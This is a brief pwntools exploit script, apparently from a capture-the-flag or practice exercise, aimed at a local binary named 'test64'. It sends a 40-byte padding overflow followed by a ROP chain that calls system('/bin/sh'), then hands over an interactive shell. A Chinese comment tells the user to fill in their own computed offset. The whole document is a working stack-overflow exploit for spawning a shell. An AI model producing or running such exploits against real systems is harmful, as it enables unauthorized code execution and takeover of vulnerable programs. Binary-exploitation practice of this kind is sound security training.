from pwn import *

elf = ELF('./test64')
p = process('./test64')

# 填入你算出的最终偏移
offset = 40

rop = ROP(elf)
rop.raw(rop.ret)
rop.system(next(elf.search(b'/bin/sh')))

payload = b'A' * offset + rop.chain()
p.sendline(payload)
p.interactive()

